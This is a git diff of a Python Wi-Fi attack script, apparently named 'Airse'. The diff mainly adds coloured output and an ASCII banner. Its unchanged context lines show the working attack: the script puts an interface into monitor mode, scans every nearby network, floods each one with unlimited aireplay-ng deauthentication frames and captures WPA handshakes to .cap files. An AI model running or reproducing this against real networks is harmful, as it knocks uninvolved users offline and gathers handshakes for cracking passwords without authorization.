@@ -3,16 +3,29 @@ import subprocess
 import time
 
 
+# ANSI escape codes for colors
+BLUE = '\033[94m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+ENDC = '\033[0m'
+
+
+
 # Print a message indicating the start of the program
-print("pls wait.....")
+print(f"{GREEN}starting...")
 
 # Print a welcome message
-print("""
-  ****************************************
-  *            OUTIS Airse               *
-  *                                      *
-  *  https://github.com/josephgeorge26   *
-  ****************************************
+print(f"""{BLUE}
+
+         █████╗ ██╗██████╗ ███████╗███████╗
+        ██╔══██╗██║██╔══██╗██╔════╝██╔════╝
+        ███████║██║██████╔╝█████╗  ███████╗
+        ██╔══██║██║██╔══██╗██╔══╝  ╚════██║
+        ██║  ██║██║██║  ██║███████╗███████║
+        ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
+      
+        * https://github.com/josephgeorge26  *
 """)
 
 def get_wifi_interface():
@@ -29,20 +42,20 @@ def get_wifi_interface():
         else:
             return None
     except Exception as e:
-        print("Error:", e)
+        print(f"{RED}Error:", e)
         return None
 
 def put_interface_into_monitor_mode(interface):
     if "mon" in interface:
-        print("Interface is already in monitor mode.")
+        print(f"{YELLOW}Interface is already in monitor mode.")
         return interface
     
     try:
         subprocess.run(["sudo", "airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        print("Interface", interface, "is in monitor mode...")
+        print(f"{GREEN}Interface", interface, "is in monitor mode...")
         return interface + "mon"
     except Exception as e:
-        print("Error:", e)
+        print(f"{RED}Error:", e)
         return None
 
 def file_checker():
@@ -66,10 +79,10 @@ def file_checker():
 def scan_networks(interface):
     try:
         os.system(f"sudo timeout 5 airodump-ng --output-format csv -w output/scan_results {interface} > /dev/null") 
-        print("Scanning for networks...")
-        print("Scan complete.")
+        print(f"{GREEN}Scanning for networks...")
+        print(f"{GREEN}Scan complete.")
     except Exception as e:
-        print("Error:", e)
+        print(f"{RED}Error:", e)
 
 def deauth_all(interface, file_name):
     try:
@@ -86,10 +99,10 @@ def deauth_all(interface, file_name):
                     networks.append((essid, bssid))
         
         for essid, bssid in networks:
-            print(f"Deauthenticating {essid} ({bssid})")
+            print(f"{RED}Deauthenticating {essid} ({bssid})")
             try:
                 os.system(f"sudo timeout 5s aireplay-ng -D --deauth 0  --ignore-negative-one  -a  {bssid} {str(get_wifi_interface())} > /dev/null &")
-                print("Deauthentication command successful.")
+                print(f"{GREEN}Deauthentication command successful.")
                 capture_handshake(interface, essid, bssid)  # Pass bssid to capture_handshake
                 time.sleep(1)
             except subprocess.CalledProcessError as e:
@@ -99,13 +112,13 @@ def deauth_all(interface, file_name):
 
 def capture_handshake(interface, essid, bssid):
     try:
-        print(f"Capturing handshake for {essid} ({bssid})...")
+        print(f"{GREEN}Capturing handshake for {essid} ({bssid})...")
         if not os.path.exists("captured_handshakes"):
             os.makedirs("captured_handshakes")
         filename = f"captured_handshakes/{essid}-{bssid}.cap"
         os.system(f"sudo timeout 5 airodump-ng --write {filename} -c 1 --bssid {bssid} {interface} > /dev/null")
 
-        print("Handshake captured.")
+        print(f"{GREEN}Handshake captured.")
     except Exception as e:
         print("Error:", e)
 
@@ -126,7 +139,7 @@ def main():
 
             exiting(monitor_interface)
     else:
-        print("Could not find wireless interface.")
+        print(f"{RED}Could not find wireless interface.")
 
 if __name__ == "__main__":
     main()
